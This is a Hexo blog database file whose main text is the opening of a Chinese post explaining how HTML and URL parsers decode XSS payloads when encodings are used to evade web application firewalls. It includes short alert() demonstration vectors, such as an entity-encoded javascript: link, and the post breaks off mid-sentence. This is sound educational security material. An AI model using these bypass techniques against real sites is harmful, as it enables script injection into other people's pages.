{"meta":{"version":1,"warehouse":"2.2.0"},"models":{"Asset":[{"_id":"source/CNAME","path":"CNAME","modified":0,"renderable":0},{"_id":"themes/zhaoo/source/css/style.styl","path":"css/style.styl","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/image/bike.png","path":"image/bike.png","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/image/favicon.ico","path":"image/favicon.ico","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/image/loading.gif","path":"image/loading.gif","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/image/post-image.jpg","path":"image/post-image.jpg","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/image/post-image2.jpg","path":"image/post-image2.jpg","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/image/welcome-image.jpg","path":"image/welcome-image.jpg","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/js/script.js","path":"js/script.js","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/lib/fancybox/fancybox.css","path":"lib/fancybox/fancybox.css","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/lib/gitalk/gitalk.css","path":"lib/gitalk/gitalk.css","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/lib/highlight/a11y-dark.css","path":"lib/highlight/a11y-dark.css","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/lib/justifiedGallery/justifiedGallery.css","path":"lib/justifiedGallery/justifiedGallery.css","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/lib/justifiedGallery/justifiedGallery.js","path":"lib/justifiedGallery/justifiedGallery.js","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/lib/lazyload/lazyload.js","path":"lib/lazyload/lazyload.js","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/lib/pjax/pjax.js","path":"lib/pjax/pjax.js","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/image/95.jpg","path":"image/95.jpg","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/image/overlay.png","path":"image/overlay.png","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/lib/fancybox/fancybox.js","path":"lib/fancybox/fancybox.js","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/lib/highlight/highlight.js","path":"lib/highlight/highlight.js","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/lib/jquery/jquery.js","path":"lib/jquery/jquery.js","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/lib/gitalk/gitalk.js","path":"lib/gitalk/gitalk.js","modified":0,"renderable":1},{"_id":"themes/zhaoo/source/image/post-image1.jpg","path":"image/post-image1.jpg","modified":0,"renderable":1}],"Cache":[{"_id":"source/CNAME","hash":"9dbddd4c474b5351d938080f9030145572f095ee","modified":1568558262000},{"_id":"themes/zhaoo/.DS_Store","hash":"de3f6d9f49475b29938852e199b691df716aac95","modified":1588822625000},{"_id":"themes/zhaoo/LICENSE","hash":"74f4b502cb5e62d3c947bc4fd16bed695d8bf65b","modified":1588822625000},{"_id":"themes/zhaoo/README_EN.md","hash":"bfa008de2ae0b7f80313fe8e19c425317bb47dca","modified":1588822625000},{"_id":"themes/zhaoo/_config.yml","hash":"dc9131b03dbd78a55fbe72b08ef61231429fb08b","modified":1592272391000},{"_id":"themes/zhaoo/README.md","hash":"579758de537ded02faefd7b871ee6cc0c1642836","modified":1588822625000},{"_id":"source/_posts/Xss攻击向量解析的探析.md","hash":"fe1eaa70994eb24d6c2c67f8bcbab82cbb3ae473","modified":1568811096000},{"_id":"source/_posts/deepin下多版本php的配置.md","hash":"b0e96da09cb9e86dd50296d9c2a5c97b7482e838","modified":1569129084000},{"_id":"source/_posts/YouDiancms审计小结.md","hash":"62e7334895bebd08372697cb9e5e8e7cbbda4e9b","modified":1588385226000},{"_id":"source/_posts/ntfs系统中的ADS供选数据流.md","hash":"78c5143a61c1e4a89ae29a8d275a95961058ead0","modified":1566048282000},{"_id":"source/_posts/seacms_getshell篇.md","hash":"38a0d01418e51fe7348cfce34f4649b963063bb2","modified":1567237734000},{"_id":"source/_posts/同源策略&JSONP及其利用.md","hash":"7d42111772310097ad1f8da8c23224aa77b58cd0","modified":1583052937000},{"_id":"source/_posts/深入理解 javascript 原型链污染.md","hash":"fcbcf650b79a621785684b7eafb28f34411fcabb","modified":1589253231000},{"_id":"source/about/index.md","hash":"86d06d611fb912883062e36f5d469a6dc9bc3706","modified":1588823755000},{"_id":"source/links/index.md","hash":"7e76a98b69864a060841bfeed8e400bb5ba62365","modified":1588823628000},{"_id":"source/tags/index.md","hash":"24d601340547e3df0b03110769c33b997a4dfeae","modified":1588823313000},{"_id":"themes/zhaoo/.git/HEAD","hash":"acbaef275e46a7f14c1ef456fff2c8bbe8c84724","modified":1588822625000},{"_id":"themes/zhaoo/.git/config","hash":"1edcc60609746be840ac58936946c68b1b93a500","modified":1588822625000},{"_id":"themes/zhaoo/.git/index","hash":"ed6fc908101ec20beb38ec007bb1531f2302480a","modified":1591420416000},{"_id":"themes/zhaoo/.git/description","hash":"9635f1b7e12c045212819dd934d809ef07efa2f4","modified":1588822427000},{"_id":"themes/zhaoo/.git/packed-refs","hash":"852676238e9e9dea24a141ce6409fe14a10b452e","modified":1588822625000},{"_id":"themes/zhaoo/languages/default.yml","hash":"1b2b75ca9ff3bfeddb596239889b584cdfcecc32","modified":1588822625000},{"_id":"themes/zhaoo/languages/fr.yml","hash":"84ab164b37c6abf625473e9a0c18f6f815dd5fd9","modified":1588822625000},{"_id":"themes/zhaoo/languages/it.yml","hash":"6ae71000ed039f56572143ffe90da17b95d1a66f","modified":1588822625000},{"_id":"themes/zhaoo/languages/nl.yml","hash":"12ed59faba1fc4e8cdd1d42ab55ef518dde8039c","modified":1588822625000},{"_id":"themes/zhaoo/languages/no.yml","hash":"965a171e70347215ec726952e63f5b47930931ef","modified":1588822625000},{"_id":"themes/zhaoo/languages/ru.yml","hash":"4fda301bbd8b39f2c714e2c934eccc4b27c0a2b0","modified":1588822625000},{"_id":"themes/zhaoo/languages/zh-CN.yml","hash":"ccbba6315760755926f5abfe1b98c225a6650581","modified":1588822625000},{"_id":"themes/zhaoo/languages/zh-TW.yml","hash":"53ce3000c5f767759c7d2c4efcaa9049788599c3","modified":1588822625000},{"_id":"themes/zhaoo/layout/archive.ejs","hash":"750acb636bd6d11114e767ba2744dd42fdc977f7","modified":1588822625000},{"_id":"themes/zhaoo/layout/categories.ejs","hash":"9c955f8bc91c6a019de4049ab0f4dd13c9e44377","modified":1588822625000},{"_id":"themes/zhaoo/layout/category.ejs","hash":"2336135690bc8d0f45a132ecd631161d99b47699","modified":1588822625000},{"_id":"themes/zhaoo/layout/galleries.ejs","hash":"1cbc236f4dc394e8b13f9faaa357eaa18e4581f4","modified":1588822625000},{"_id":"themes/zhaoo/layout/gallery.ejs","hash":"548791f1d5787a7e1aee6530028131e740807383","modified":1588822625000},{"_id":"themes/zhaoo/layout/index.ejs","hash":"c4f1a936dd28df52d5f49b2990c93835407ff908","modified":1588822625000},{"_id":"themes/zhaoo/layout/layout.ejs","hash":"25c6f95f79fa86a38c9c71014298fd8fa9bce3f7","modified":1588822625000},{"_id":"themes/zhaoo/layout/post.ejs","hash":"64262b4be81eabdbd5dec259a6f892c61e3e6668","modified":1588822625000},{"_id":"themes/zhaoo/layout/tag.ejs","hash":"1a011da69380b8db7195c64841961dfeb41aa819","modified":1588822625000},{"_id":"themes/zhaoo/layout/tags.ejs","hash":"f70c19d324de344ee70de101a4b66d67978de25b","modified":1588822625000},{"_id":"themes/zhaoo/screenshots/.DS_Store","hash":"a270eb44ff20fc53fbea51c0e627613b3d0366e1","modified":1588822625000},{"_id":"themes/zhaoo/scripts/merge-configs.js","hash":"32ff554accb6db5c27ce1c835d7ca08274495613","modified":1588822625000},{"_id":"themes/zhaoo/source/.DS_Store","hash":"b52c268f37fbeb374b3b991fc67ceffddd8374e8","modified":1592268956000},{"_id":"themes/zhaoo/.git/hooks/applypatch-msg.sample","hash":"4de88eb95a5e93fd27e78b5fb3b5231a8d8917dd","modified":1588822427000},{"_id":"themes/zhaoo/.git/hooks/commit-msg.sample","hash":"ee1ed5aad98a435f2020b6de35c173b75d9affac","modified":1588822427000},{"_id":"themes/zhaoo/.git/hooks/fsmonitor-watchman.sample","hash":"f7c0aa40cb0d620ff0bca3efe3521ec79e5d7156","modified":1588822427000},{"_id":"themes/zhaoo/.git/hooks/post-update.sample","hash":"b614c2f63da7dca9f1db2e7ade61ef30448fc96c","modified":1588822427000},{"_id":"themes/zhaoo/.git/hooks/pre-applypatch.sample","hash":"f208287c1a92525de9f5462e905a9d31de1e2d75","modified":1588822427000},{"_id":"themes/zhaoo/.git/hooks/pre-commit.sample","hash":"33729ad4ce51acda35094e581e4088f3167a0af8","modified":1588822427000},{"_id":"themes/zhaoo/.git/hooks/pre-push.sample","hash":"5c8518bfd1d1d3d2c1a7194994c0a16d8a313a41","modified":1588822427000},{"_id":"themes/zhaoo/.git/hooks/pre-rebase.sample","hash":"288efdc0027db4cfd8b7c47c4aeddba09b6ded12","modified":1588822427000},{"_id":"themes/zhaoo/.git/hooks/pre-receive.sample","hash":"705a17d259e7896f0082fe2e9f2c0c3b127be5ac","modified":1588822427000},{"_id":"themes/zhaoo/.git/hooks/prepare-commit-msg.sample","hash":"2584806ba147152ae005cb675aa4f01d5d068456","modified":1588822427000},{"_id":"themes/zhaoo/.git/hooks/update.sample","hash":"e729cd61b27c128951d139de8e7c63d1a3758dde","modified":1588822427000},{"_id":"themes/zhaoo/.git/info/exclude","hash":"c879df015d97615050afa7b9641e3352a1e701ac","modified":1588822427000},{"_id":"themes/zhaoo/.git/logs/HEAD","hash":"01ed991fbee07e86e6b620dc19d2fcfb6c751b9d","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/footer.ejs","hash":"6480287a08958617835849380f5f06c19bb30eaf","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/head.ejs","hash":"8a3fd5481b76e06eb5b132094486895cbd9573ef","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/header.ejs","hash":"44f1fe3d319efbf7d19218dba7c05a292e4db1b2","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/menu.ejs","hash":"750fdae95419c9709979f46c8a93606de6987b1b","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/script.ejs","hash":"74506d96b5650d754727917500afe649f200fb45","modified":1588822625000},{"_id":"themes/zhaoo/scripts/filter/lazyload.js","hash":"ce7a4961731571fc97ee294937ef9e0d99ecee88","modified":1588822625000},{"_id":"themes/zhaoo/scripts/helper/title.js","hash":"03c1b75085d86bf94d89588e3d3775e9a7a696b9","modified":1588822625000},{"_id":"themes/zhaoo/source/css/_variables.styl","hash":"7d2a95ddd0a652bbb165f2d4de3574741dc0b50a","modified":1588822625000},{"_id":"themes/zhaoo/source/css/style.styl","hash":"5fa109ed64a4ce54fec677288cf2a9986a93574a","modified":1588822625000},{"_id":"themes/zhaoo/source/image/.DS_Store","hash":"3e89dc592b1e6f3d99abcb498bcaf41832cf6be1","modified":1592268789000},{"_id":"themes/zhaoo/source/image/bike.png","hash":"014cf4475505abb7b44ca4bf1fdc3498427c46d0","modified":1578654811000},{"_id":"themes/zhaoo/source/image/favicon.ico","hash":"ec73f5873fe859e8c3be99c0d5740a0f1b8451cd","modified":1579495421000},{"_id":"themes/zhaoo/source/image/loading.gif","hash":"db91090dd60098086993953f88c37a332eea70d7","modified":1588822625000},{"_id":"themes/zhaoo/source/image/post-image.jpg","hash":"5bc929389181b8651d27da640486c2d29c158782","modified":1578654901000},{"_id":"themes/zhaoo/source/image/post-image2.jpg","hash":"9411f4b3b9d6a297019e5f9077fbc462b0669841","modified":1578654789000},{"_id":"themes/zhaoo/source/image/welcome-image.jpg","hash":"89c99550af9a8c7a5f073960def781bc21eed3dc","modified":1578380728000},{"_id":"themes/zhaoo/source/js/.DS_Store","hash":"447401210d1c2d11a6835e9bff715a35ac9e5c55","modified":1588822625000},{"_id":"themes/zhaoo/source/js/script.js","hash":"08630d077c574297b5cc2c110472924042dec667","modified":1588822625000},{"_id":"themes/zhaoo/source/lib/.DS_Store","hash":"86b6072091e6a98af2fb5ce2c9597586ae4c4f31","modified":1588822625000},{"_id":"themes/zhaoo/.git/refs/heads/master","hash":"a73fcbc3b5c584d8730374d4397781811713e3f2","modified":1588822625000},{"_id":"themes/zhaoo/.git/objects/pack/pack-47c48530bda39c8f3833572cdef84d9943a68f15.idx","hash":"2df6b7b62258f1b72ecde41e8f69008c60d87ec7","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/common/comment.ejs","hash":"6a5b0db7f16b9aa8fccde89653f9945ab633a722","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/common/loading.ejs","hash":"81680b42a796d4d500eda9c5d87d8e80e4b938b2","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/common/fab.ejs","hash":"72b14074b8f9eef7e992d722acdcf551472c80b5","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/common/preview.ejs","hash":"774ece0495e55cfb2f03db1c48d9b0e9ea38259f","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/common/paginator.ejs","hash":"33c474274de7d37cde0b0345e73f66a098da3bf7","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/common/visitors.ejs","hash":"32d11103402a09e164974d100933e5705ffa12ec","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/index/item.ejs","hash":"2c82443dae47a2723bcd162c5e77bf2d1ebd5b64","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/index/post.ejs","hash":"02a15b5998c41038c32c1eb28754252e0ff17545","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/post/article.ejs","hash":"9b5154e13fda4538b655dd172236a8e174d08a1c","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/post/donate.ejs","hash":"7b5d92bb8aa64595270b1918e7d9e469414118da","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/post/nav.ejs","hash":"636b48ccd3d063bb83d0392c9a3b00a697aa593a","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/post/head.ejs","hash":"f0d60f33ef48b2fcd6c709fcc5dec63a5361660a","modified":1588822625000},{"_id":"themes/zhaoo/layout/_partial/post/tag.ejs","hash":"01492168b9265ae05b4309514ad1d89c9e12f4c2","modified":1588822625000},{"_id":"themes/zhaoo/source/css/_partial/archive.styl","hash":"df62b83dfee198ec3dd1f706d8763e2528bff118","modified":1588822625000},{"_id":"themes/zhaoo/source/css/_partial/categories.styl","hash":"383dbc42159e1eaa643275bdd2bbe595a08a0a05","modified":1588822625000},{"_id":"themes/zhaoo/source/css/_partial/common.styl","hash":"4945299fa7079bb1691051ae28529827633ebf60","modified":1589189880000},{"_id":"themes/zhaoo/source/css/_partial/footer.styl","hash":"73f24b55296129227e2e9f8123060988f14983d4","modified":1588822625000},{"_id":"themes/zhaoo/source/css/_partial/galleries.styl","hash":"3e2450a34ca12ccab86d53a9e4c3146c3b6235ec","modified":1588822625000},{"_id":"themes/zhaoo/source/css/_partial/header.styl","hash":"a386c06226e84405cd213c0182b9d12eadf155d6","modified":1588822625000},{"_id":"themes/zhaoo/source/css/_partial/index.styl","hash":"c4bf774e0f29c6931e16aa79940f0093c9194c17","modified":1588822625000},{"_id":"themes/zhaoo/source/css/_partial/menu.styl","hash":"cb5864ab9455fa763279dc6729e8dcda2c00fd80","modified":1588822625000},{"_id":"themes/zhaoo/source/css/_partial/post.styl","hash":"92abd4bbd47c0290f4bca78d37134127b34bf028","modified":1588822625000},{"_id":"themes/zhaoo/source/css/_partial/reset.styl","hash":"26a53e5178853ed50acdf5ffd4e118f4e5af497f","modified":1588822625000},{"_id":"themes/zhaoo/source/css/_partial/tags.styl","hash":"461a529ae851894e6707ac22cafdcdaaf183ba39","modified":1588822625000},{"_id":"themes/zhaoo/source/image/article/.DS_Store","hash":"df2fbeb1400acda0909a32c1cf6bf492f1121e07","modified":1588830391000},{"_id":"themes/zhaoo/source/lib/fancybox/fancybox.css","hash":"1be9b79be02a1cfc5d96c4a5e0feb8f472babd95","modified":1588822625000},{"_id":"themes/zhaoo/source/lib/gitalk/gitalk.css","hash":"99f6725b386bdb0f52d15b0dd7877eaf1ad4c918","modified":1588822625000},{"_id":"themes/zhaoo/source/lib/gitalk/.DS_Store","hash":"d0c74f5f99535ad14eaec93484abb4ff8dbca277","modified":1588822625000},{"_id":"themes/zhaoo/source/lib/highlight/a11y-dark.css","hash":"9f0c935216015dd88251a6c366bdd00abfe65982","modified":1588822625000},{"_id":"themes/zhaoo/source/lib/justifiedGallery/justifiedGallery.css","hash":"92bb6e468a1db7fbd99ccb960e15e28572254263","modified":1588822625000},{"_id":"themes/zhaoo/source/lib/justifiedGallery/justifiedGallery.js","hash":"82ab395176c927ffbb2f7c95132ee0a06cd5d64a","modified":1588822625000},{"_id":"themes/zhaoo/source/lib/lazyload/lazyload.js","hash":"338318e930487b2791a7bcf53ad4601630cc41e2","modified":1588822625000},{"_id":"themes/zhaoo/source/lib/pjax/pjax.js","hash":"0ced78e5c97127948f5bfbfbb80c4fce5c0f671e","modified":1588822625000},{"_id":"themes/zhaoo/source/image/95.jpg","hash":"a484620f9aa2718bab8302017f9d16353a17aeb0","modified":1578199238000},{"_id":"themes/zhaoo/source/image/overlay.png","hash":"fdf44a91026ad999dca2f0a42213aabebd783c98","modified":1588822625000},{"_id":"themes/zhaoo/source/lib/fancybox/fancybox.js","hash":"6181412e73966696d08e1e5b1243a572d0f22ba6","modified":1588822625000},{"_id":"themes/zhaoo/source/lib/highlight/highlight.js","hash":"a52ef27b8a21963326b05ef06f6ee104b8b94e7e","modified":1588822625000},{"_id":"themes/zhaoo/source/lib/jquery/jquery.js","hash":"88523924351bac0b5d560fe0c5781e2556e7693d","modified":1588822625000},{"_id":"themes/zhaoo/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1588822625000},{"_id":"themes/zhaoo/.git/logs/refs/heads/master","hash":"01ed991fbee07e86e6b620dc19d2fcfb6c751b9d","modified":1588822625000},{"_id":"themes/zhaoo/source/lib/gitalk/gitalk.js","hash":"266500948447c95aeea95ef6760f192afc96fd5e","modified":1588822625000},{"_id":"themes/zhaoo/.git/logs/refs/remotes/origin/HEAD","hash":"01ed991fbee07e86e6b620dc19d2fcfb6c751b9d","modified":1588822625000},{"_id":"themes/zhaoo/screenshots/article.png","hash":"5057c0df7807f18b8a0c631c1669d6ac0bc1e7d7","modified":1588822625000},{"_id":"themes/zhaoo/source/image/post-image1.jpg","hash":"b3a0f3b9a580343449f2c9b078d85b64ce94a34d","modified":1588822625000},{"_id":"themes/zhaoo/screenshots/home.png","hash":"1a834bab14de3e3b32421c048ef0b16cd781cd49","modified":1588822625000},{"_id":"themes/zhaoo/.git/objects/pack/pack-47c48530bda39c8f3833572cdef84d9943a68f15.pack","hash":"dbc7a71b2b5ac11ee22513b006825886b4a5291e","modified":1588822625000},{"_id":"public/about/index.html","hash":"4a75fe5be18c963b36fa74527d18252d1da93c3c","modified":1592272397695},{"_id":"public/links/index.html","hash":"6380bd5d20b3c449afe5734a09c973a7c30f36a1","modified":1592272397695},{"_id":"public/tags/index.html","hash":"a7e1d18ea650ff357279179d9557011764c46967","modified":1592272397695},{"_id":"public/index.html","hash":"bd943a83a1f95464b75bb0476d135e405dc60836","modified":1592272397698},{"_id":"public/archives/index.html","hash":"e0b57947cbdd6d3a5fad9452fff3f0c9f2cf787a","modified":1592272397695},{"_id":"public/archives/2019/index.html","hash":"5bc25ed58879fc950ee75259720109cbd1afac2b","modified":1592272397695},{"_id":"public/archives/2019/08/index.html","hash":"9d6e3bf560636f962545358f1345b6c3d238a2e0","modified":1592272397696},{"_id":"public/archives/2019/09/index.html","hash":"c64c87207be9edc31e0c534f63130e05c7f6730a","modified":1592272397696},{"_id":"public/archives/2019/10/index.html","hash":"e092d4f5ce94bfde53dc0d96e311dc2793da28b8","modified":1592272397696},{"_id":"public/tags/xss/index.html","hash":"6d886579a827f567ddcb080b56567774b7a66e7b","modified":1592272397696},{"_id":"public/tags/javascript/index.html","hash":"4704e80048ef4e33774448b83eaabbd894058fa3","modified":1592272397696},{"_id":"public/tags/tips/index.html","hash":"66fc286c54442d6403d74d888b1cddd4f25f908e","modified":1592272397696},{"_id":"public/tags/deepin/index.html","hash":"8ffd35d67f1a5ab69b6f3a2f45c13da9fc1cb80e","modified":1592272397696},{"_id":"public/tags/环境/index.html","hash":"9749ee2a09399613dc207dddc706bfa95df7b30a","modified":1592272397697},{"_id":"public/tags/php/index.html","hash":"76ce00b5d02d701a174f559398f1831c1fab1cf1","modified":1592272397697},{"_id":"public/tags/代码审计/index.html","hash":"ff51325e31822e1d01cac9b0ad8dae65fd46cb05","modified":1592272397697},{"_id":"public/tags/ntfs/index.html","hash":"7671301bda35ff2fc82d59e4f4b92d3131d06bbf","modified":1592272397697},{"_id":"public/2019/10/06/YouDiancms审计小结/index.html","hash":"8b15c81af3a97fdc21ca291e9f3265846aae4c64","modified":1592272397698},{"_id":"public/2019/09/18/deepin下多版本php的配置/index.html","hash":"fd94e854efed4be4a04f43af2ce6da6fb4c5bfb0","modified":1592272397699},{"_id":"public/2019/09/17/Xss攻击向量解析的探析/index.html","hash":"4fd64faabb2ee6c95b18d86b0979c75061a5996b","modified":1592272397699},{"_id":"public/2019/09/09/深入理解 javascript 原型链污染/index.html","hash":"f374db7aed87e53a8ed45e12427cb5adc4bdace1","modified":1592272397699},{"_id":"public/2019/09/02/同源策略&JSONP及其利用/index.html","hash":"d69d0236bf89c802bcd930c3792653f032c3cb30","modified":1592272397699},{"_id":"public/2019/08/17/seacms_getshell篇/index.html","hash":"7a397b5621c802efe27f970b299cf5e886edce57","modified":1592272397699},{"_id":"public/2019/08/17/ntfs系统中的ADS供选数据流/index.html","hash":"cb09d3c6a5d3dbcfad035b3de77f8d8e449fcad0","modified":1592272397699},{"_id":"public/tags/方法/index.html","hash":"65c4a411350b922b4041333ab2532108a6278f4f","modified":1592272397697},{"_id":"public/tags/vulneralbility/index.html","hash":"185861300fb2f44327eaf22b811d94b80a051724","modified":1592272397697},{"_id":"public/tags/object-Object/index.html","hash":"00af266d5e22b5ba74bfcc84d64967cd425ad83c","modified":1592272397698},{"_id":"public/css/blog-encrypt.css","hash":"22e25b0d16ea053d25eb971e038c817a4c9cb584","modified":1592272333235},{"_id":"public/lib/blog-encrypt.js","hash":"96509f92b7037e8f750e4684cd440a3af98d9fec","modified":1592272333235}],"Category":[],"Data":[],"Page":[{"title":"about","type":"about","layout":"about","date":"2020-05-07T03:54:43.000Z","_content":"\n- 太菜，目前没有关于我.\n","source":"about/index.md","raw":"---\ntitle: about\ntype: \"about\"\nlayout: \"about\"\ndate: 2020-05-07 11:54:43\n---\n\n- 太菜，目前没有关于我.\n","updated":"2020-05-07T03:55:55.000Z","path":"about/index.html","comments":1,"_id":"ckbh7yzg90001mp7gteg73qvb","content":"<ul>\n<li>太菜，目前没有关于我.</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li>太菜，目前没有关于我.</li>\n</ul>\n"},{"title":"links","date":"2019-09-04T10:12:36.000Z","type":"links","_content":"\n[ll](http://llfam.cn)\n[car0ta](http://car0ta.top)\n[c1ick](http://blog.c1ick.xyz)\n","source":"links/index.md","raw":"---\n\ntitle: links\ndate: 2019-09-04 18:12:36\ntype: \"links\"\n---\n\n[ll](http://llfam.cn)\n[car0ta](http://car0ta.top)\n[c1ick](http://blog.c1ick.xyz)\n","updated":"2020-05-07T03:53:48.000Z","path":"links/index.html","comments":1,"layout":"page","_id":"ckbh7yzgd0003mp7gpumcc7qn","content":"<p><a href=\"http://llfam.cn\" target=\"_blank\" rel=\"noopener\">ll</a><br><a href=\"http://car0ta.top\" target=\"_blank\" rel=\"noopener\">car0ta</a><br><a href=\"http://blog.c1ick.xyz\" target=\"_blank\" rel=\"noopener\">c1ick</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://llfam.cn\" target=\"_blank\" rel=\"noopener\">ll</a><br><a href=\"http://car0ta.top\" target=\"_blank\" rel=\"noopener\">car0ta</a><br><a href=\"http://blog.c1ick.xyz\" target=\"_blank\" rel=\"noopener\">c1ick</a></p>\n"},{"title":"tags","date":"2020-05-07T03:48:33.000Z","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2020-05-07 11:48:33\n---\n","updated":"2020-05-07T03:48:33.000Z","path":"tags/index.html","comments":1,"layout":"page","_id":"ckbh7yzgi0006mp7g0aia0ok7","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"Xss 攻击向量解析的探析","date":"2019-09-16T16:00:00.000Z","_content":"\n\n\n# 1@ 前言\n\n当利用编码来绕过有关 xss 的 waf 的时候，有时我们构造的 payload 得不到执行。纵然你的编码方式是对的，但是如果对应的解析器不解析你的攻击向量，也是徒劳的。这时候我们就需要比较清晰的了解自己的 payload 所遵守的解析策略与经历的解析流程，然后构造出更加有针对性的攻击向量。\n\n\n\n# 2@ 基础铺垫\n\n在了解一个 payload 解析流程之前，我们需要先熟悉一些用到的基础知识。\n\n## 2.1 HTML字符实体\n\n在 HTML 中，字符实体其实就是转义序列，一般是为了正确显示保留，如 **‘<’**, **‘>’**, **空格**等。HTML 中的实体转义格式有以下两种：\n\n### Entity name （实体名称）\n\n格式 ： **&实体名;**\n\neg ： `&lt;` （less than）表示 ‘<’\n\n[更多的字符实体名戳这里](http://www.w3school.com.cn/html/html_entities.asp)\n\n### Entity Number (实体编号)\n\n格式 ： **&实体编号;**\n\n其中实体编号可以 是 16 进制格式 **&#x** 开头，或者 10 进制格式的 **&#** 开头。\n\neg ： `&#65;` 表示字符 ‘A’ \n\n\n\n## 2、 JS 中的 unicode 表示\n\n格式 ：**\\u + 16 进制的 unicode 编码**\n\neg : `\\u5b89` 表示汉字 **安**\n\n\n\n# 3@ 攻击向量经历的三种解析\n\n## 1、HTML 解析\n\n原版的 HTML 解析规则[戳这](http://www.whatwg.org/specs/web-apps/current-work/multipage/tokenization.html)。\n\neg : `<a href=\"http://www.baidu.com\">text</a>`\n\n联想一下我们学过的数电，可以视 HTML 解析器为一个状态机，遍历获得的字符，按照规则进行状态的转换。以上面的例子：\n\n当碰到 **<** 字符的时候，就会转换到标签开始状态 (Tag open state)【前提是紧跟字符不为 **/**】\n\n然后跳转到 标签名状态（Tag name state) 【对应例子里面的 a 】\n\n. . . . . .\n\n进入数据状态 (Data state) 【对应例子里面的 **text** 】, 在刚进入这个状态时，释放当前标签的 token 【对应例子里面的 a 标签的前部分】。在数据状态时，每发现一个完整的标签，就会释放一个 token.\n\n那么，是否存在这样一个位置状态，它可以将我们的字符实体解析并赋予本来的非字符的特殊意义(如 `&lt;`表示 **<**可以当标签开始符来对待，然后让其中的脚本执行)? 答案是：没有。这就与 HTML 解析 规则有关。我们再拿一个例子来讲：\n\n`<div>&lt;script>alert(1);</script></div>`\n\n因为 div 标签开始后，解析器还是在数据状态，不会将这个字符引用转换为 ‘标签开始状态’，所以就可以保证我们得到的字符实体引用只会被解析为单纯的数据，而没有特殊意义，从而从一定程度上杜绝了一些风险。 ![xss_1](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_1.png)\n\n从图中我们可以看出来，’<’ 标签已经被转义，但是只是作为纯字符输出在页面中。之后的 由于未配对成功而被解析器去除。\n\n而在 HTML 中也并不是所有位置都会解析转义字符引用，有三种情况下会转义：\n\n### 数据状态的解析\n\n`<div>&lt;&gt;</div>`\n\n![xss_2](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_2.png)\n\n可以看到字符引用被解析。\n\n### 属性值中的解析\n\n`<a href=\"javascript:alert&#40;1)\"></a>`\n\n![xss_3](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_3.png)\n\n可以看到 ‘(‘ 被解码。\n\n### RCDATA状态下的字符引用\n\n这时我们需要先了解下 HTML 中的 5 类元素\n\n```\n1.  空元素(Void elements)，如<area>,<br>,<base>等等\n\n2.  原始文本元素(Raw text elements)，有<script>和<style>\n\n3.  RCDATA元素(RCDATA elements)，有<textarea>和<title>\n\n4.  外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素\n\n5.  基本元素(Normal elements)，即除了以上4种元素以外的元素\n\n五类元素的区别如下：\n\n1.  空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。\n\n2.  原始文本元素，可以容纳文本。\n\n3.  RCDATA元素，可以容纳文本和字符引用。\n\n4.  外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释\n\n5.  基本元素，可以容纳文本、字符引用、其他元素和注释\n```\n\n \n\n由于 RCDATA 状态中可以转义字符实体，那么在像 **textarea** **title** 等标签中就可以字符引用。这里 还有一个特殊的点就是在 **RCDATA** 元素标签 的内容中，遇到 `<` 后，会进入 **RCADATA小于号状态**，如果紧接着不是`/`字符的话，就会返回到 **RCDATA状态**。那么也就是说在 **textarea**或者**title**标签中只能认识并解析的标签只有对应的 **</textarea>**或者 **</title>**,不会有新标签的产生，也就杜绝了脚本的执行。例如：\n\n`<textarea><script>alert(6)</script></textarea>`\n\n是不会执行的。\n\n## 2、URL 解析\n\n同样的，URL 解析器依旧可以看做一个状态机，其解析规则在[这里](http://url.spec.whatwg.org/)。这里只提几个 xss_payload 能涉及到的地方。\n\n1、首先，资源类型必须是大写字母或者小写字母，否则会进入到无状态类型。那首先就要求资源的协议要保证格式完全的正确,譬如使用 **javascript:** 伪协议时不能使用编码来绕过，因为这会让 URL 解析器跳转到 ‘ 无类型 